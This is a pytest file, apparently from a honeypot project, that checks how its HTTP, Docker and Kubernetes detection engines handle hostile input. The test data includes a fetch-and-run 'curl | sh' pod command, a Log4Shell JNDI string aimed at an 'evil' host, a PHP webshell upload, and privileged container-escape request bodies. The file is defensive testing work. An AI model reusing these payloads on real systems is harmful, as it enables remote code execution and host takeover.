"""Audit slice A3 — hostile input to the aiohttp engines and `identity_runner`.

Regex checks run in a daemon thread with a join timeout: a catastrophic
backtrack holds the GIL-bound thread, not the test, so a regression fails
instead of freezing the suite. Engine checks are wrapped in `asyncio.wait_for`.
"""

from __future__ import annotations

import asyncio
import json
import os
import re
import socket
import threading
import time
from collections.abc import Callable
from typing import Any

import pytest

os.environ["DATABASE_URL"] = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///:memory:")

pytestmark = pytest.mark.asyncio


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    buffer = event_buffer.get_buffer()
    await buffer.start()
    yield
    await buffer.stop()
    await close_db()
    event_buffer.reset_for_tests()


def _free_port() -> int:
    s = socket.socket()
    s.bind(("0.0.0.0", 0))
    port = s.getsockname()[1]
    s.close()
    return port


async def _register(name: str, hp_type: Any) -> int:
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotStatus

    port = _free_port()
    async with get_session() as session:
        session.add(
            Honeypot(name=name, type=hp_type, port=port, status=HoneypotStatus.RUNNING, config={})
        )
    return port


async def _alerts(event_type: str, timeout: float = 5.0) -> list[Any]:
    from sqlalchemy import select

    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    deadline = time.monotonic() + timeout
    while True:
        async with get_session() as session:
            rows = (await session.execute(select(Alert))).scalars().all()
        found = [a for a in rows if a.event_type == event_type]
        if found or time.monotonic() > deadline:
            return found
        await asyncio.sleep(0.05)


def _within(seconds: float, fn: Callable[[], Any]) -> Any:
    box: dict[str, Any] = {}

    def run() -> None:
        box["v"] = fn()

    t = threading.Thread(target=run, daemon=True)
    started = time.monotonic()
    t.start()
    t.join(seconds)
    assert not t.is_alive(), f"did not finish within {seconds}s (ReDoS regression)"
    assert time.monotonic() - started < seconds
    return box["v"]


# ── 1. ReDoS ────────────────────────────────────────────────────────────────


async def test_ognl_quadratic_input_is_fast_and_real_ognl_still_matches():
    from honeypot_mcp.engines.http import _classify_http_attack

    labels, _ = _within(1.0, lambda: _classify_http_attack("%{" * 32768))
    assert "ognl_struts" not in labels
    labels, sev = _classify_http_attack("%{(#_memberAccess['allowStaticMethodAccess']=true)}")
    assert "ognl_struts" in labels and sev is not None and sev.value == "critical"
    # A closing brace between opener and marker is not OGNL.
    assert "ognl_struts" not in _classify_http_attack("%{x} ognl")[0]


async def test_docker_image_redos_is_fast_and_miner_still_flagged():
    from honeypot_mcp.engines.docker_api import analyse_container_create

    hostile = "docker.io/alpine" + "curl" * 16384 + "x"
    _within(1.0, lambda: analyse_container_create({"Image": hostile}))
    reasons = analyse_container_create({"Image": "docker.io/alpine:latest curl x | sh"})
    assert reasons
    reasons = _within(1.0, lambda: analyse_container_create({"Cmd": ["curl " + "a" * 200000]}))
    assert reasons == []


async def test_kubernetes_command_redos_is_fast_and_payload_still_flagged():
    from honeypot_mcp.engines.kubernetes import analyse_pod_spec

    hostile = {"spec": {"containers": [{"command": ["kubectl " * 20000]}]}}
    _within(1.0, lambda: analyse_pod_spec(hostile))
    hostile2 = {"spec": {"containers": [{"command": ["curl" + " a" * 65536]}]}}
    _within(1.0, lambda: analyse_pod_spec(hostile2))
    real = {"spec": {"containers": [{"command": ["sh", "-c", "curl http://x/y | sh"]}]}}
    assert any("payload" in r or "command" in r for r in analyse_pod_spec(real))


# ── 7. type-confused pod fields ─────────────────────────────────────────────


@pytest.mark.parametrize(
    "body",
    [
        {"spec": {"volumes": 5}},
        {"spec": {"containers": 5}},
        {"spec": {"containers": [{"command": 5, "args": 7}]}},
        {"spec": {"containers": [{"securityContext": {"capabilities": {"add": 5}}}]}},
        {"metadata": "x", "spec": {"containers": ["not-a-dict"]}},
    ],
)
async def test_pod_spec_survives_wrong_types(body: dict[str, Any]):
    from honeypot_mcp.engines.kubernetes import analyse_pod_spec

    assert isinstance(analyse_pod_spec(body), list)


async def test_kubernetes_wrong_typed_metadata_is_still_recorded():
    from aiohttp.test_utils import TestClient, TestServer

    from honeypot_mcp.engines.kubernetes import KubernetesEngine
    from honeypot_mcp.storage.models import HoneypotType

    await _register("k8s-a3", HoneypotType.KUBERNETES)
    client = TestClient(TestServer(KubernetesEngine()._build_app("k8s-a3", None)))
    await client.start_server()
    try:
        resp = await client.post(
            "/api/v1/namespaces/default/pods",
            json={"metadata": "x", "spec": {"containers": 5, "volumes": 5}},
        )
        assert resp.status < 500
    finally:
        await client.close()
    assert await _alerts("kubernetes_pod_create")


# ── 6. split bodies ─────────────────────────────────────────────────────────


async def _split_post(port: int, path: str, body: bytes) -> bytes:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    head = (
        f"POST {path} HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode()
    half = len(body) // 2
    writer.write(head + body[:half])
    await writer.drain()
    await asyncio.sleep(0.3)
    writer.write(body[half:])
    await writer.drain()
    data = await reader.read()
    writer.close()
    return data


async def test_split_body_docker_escape_is_classified_escape():
    from aiohttp.test_utils import TestServer

    from honeypot_mcp.engines.docker_api import DockerAPIEngine
    from honeypot_mcp.storage.models import HoneypotType

    await _register("docker-a3", HoneypotType.DOCKER_API)
    server = TestServer(DockerAPIEngine()._build_app("docker-a3", None))
    await server.start_server()
    try:
        body = json.dumps(
            {"Image": "alpine", "HostConfig": {"Binds": ["/:/mnt"], "Privileged": True}}
        ).encode()
        await asyncio.wait_for(_split_post(server.port, "/containers/create", body), 5)
    finally:
        await server.close()
    assert await _alerts("docker_api_container_escape")


async def test_split_body_kubernetes_escape_is_classified_escape():
    from aiohttp.test_utils import TestServer

    from honeypot_mcp.engines.kubernetes import KubernetesEngine
    from honeypot_mcp.storage.models import HoneypotType

    await _register("k8s-a3-split", HoneypotType.KUBERNETES)
    server = TestServer(KubernetesEngine()._build_app("k8s-a3-split", None))
    await server.start_server()
    try:
        body = json.dumps(
            {
                "metadata": {"name": "pwn"},
                "spec": {
                    "hostPID": True,
                    "volumes": [{"name": "h", "hostPath": {"path": "/"}}],
                    "containers": [{"name": "c", "image": "alpine"}],
                },
            }
        ).encode()
        path = "/api/v1/namespaces/default/pods"
        await asyncio.wait_for(_split_post(server.port, path, body), 5)
    finally:
        await server.close()
    assert await _alerts("kubernetes_pod_escape")


# ── HTTP engine: 2, 4 ───────────────────────────────────────────────────────


@pytest.fixture
async def http_port():
    from honeypot_mcp.engines.http import HTTPEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("http-a3", HoneypotType.HTTP)
    engine = HTTPEngine()
    cid = await engine.start("http-a3", port, {"persona": "nginx_stable"})
    try:
        yield port
    finally:
        await engine.stop(cid)


async def test_padded_log4shell_body_still_classified(http_port: int):
    import aiohttp

    body = "A" * 200_000 + " ${jndi:ldap://evil/a}"
    async with (
        aiohttp.ClientSession() as s,
        s.post(
            f"http://127.0.0.1:{http_port}/api",
            data=body,
            headers={"Content-Type": "text/plain"},
            timeout=aiohttp.ClientTimeout(total=5),
        ) as resp,
    ):
        await resp.read()
    events = await _alerts("http_exploit_attempt")
    assert events and "log4shell" in events[0].payload["exploit_categories"]
    assert events[0].payload.get("scan_truncated") is True


async def test_multipart_upload_round_trips_to_db(http_port: int):
    import aiohttp

    form = aiohttp.FormData()
    form.add_field("username", "admin")
    form.add_field(
        "file", b"<?php system($_GET['c']); ?>", filename="s.php", content_type="text/x-php"
    )
    async with (
        aiohttp.ClientSession() as s,
        s.post(
            f"http://127.0.0.1:{http_port}/upload",
            data=form,
            timeout=aiohttp.ClientTimeout(total=5),
        ) as resp,
    ):
        await resp.read()
    events = await _alerts("http_exploit_attempt")
    assert events, "upload event was dropped from its flush batch"
    entry = events[0].payload["post_data"]["file"]
    assert entry["filename"] == "s.php" and entry["size"] == len(b"<?php system($_GET['c']); ?>")
    assert re.fullmatch(r"[0-9a-f]{64}", entry["sha256"])
    assert "webshell" in events[0].payload["exploit_categories"]


async def test_cookieless_scanner_still_escalates_to_recon(http_port: int):
    import aiohttp

    async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as s:
        for i in range(6):
            async with s.get(f"http://127.0.0.1:{http_port}/page{i}") as resp:
                await resp.read()
    assert await _alerts("http_active_recon")


async def test_session_table_is_capped():
    from honeypot_mcp.engines.http import _SessionTable

    table = _SessionTable(cap=100)
    for i in range(1000):
        table.touch(None, f"10.0.{i // 256}.{i % 256}")
    assert len(table._sessions) <= 100 and len(table._by_ip) <= 100


# ── 8. bait key ─────────────────────────────────────────────────────────────


async def test_bait_aws_key_is_random_per_render():
    from honeypot_mcp.engines import http_templates

    keys = set()
    for name in http_templates._TEMPLATES:
        for _ in range(2):
            keys.update(re.findall(r"AKIA[A-Z0-9]{16}", http_templates.get_template(name)))
    assert "AKIA4NJ7IM3CYRX3XGZP" not in keys
    assert len(keys) >= 2


# ── 5. identity_runner hygiene ──────────────────────────────────────────────


async def _identity_runner_on_free_port(**kwargs):
    from aiohttp import web

    from honeypot_mcp.http_identity import identity_runner

    async def ok(_request: web.Request) -> web.Response:
        return web.Response(text="ok")

    app = web.Application()
    app.router.add_get("/", ok)
    runner = identity_runner(app, "nginx", **kwargs)
    await runner.setup()
    port = _free_port()
    await web.TCPSite(runner, "127.0.0.1", port).start()
    return runner, port


async def test_identity_runner_caps_connections_per_ip():
    # A long first-request timer, so only the per-IP cap can close the third socket.
    runner, port = await _identity_runner_on_free_port(
        max_connections_per_ip=2, first_request_timeout=30
    )
    try:
        r1, w1 = await asyncio.open_connection("127.0.0.1", port)
        r2, w2 = await asyncio.open_connection("127.0.0.1", port)
        r3, w3 = await asyncio.open_connection("127.0.0.1", port)
        assert await asyncio.wait_for(r3.read(), 2) == b"", "the third connection was admitted"
        # The two admitted connections are still open (their read times out).
        with pytest.raises(TimeoutError):
            await asyncio.wait_for(r1.read(), 0.5)
        for w in (w1, w2, w3):
            w.close()
    finally:
        await runner.cleanup()


async def test_identity_runner_closes_a_connection_that_never_sends_a_request():
    runner, port = await _identity_runner_on_free_port(
        max_connections_per_ip=100, first_request_timeout=0.3
    )
    try:
        r1, w1 = await asyncio.open_connection("127.0.0.1", port)
        assert await asyncio.wait_for(r1.read(), 2) == b""
        w1.close()
    finally:
        await runner.cleanup()
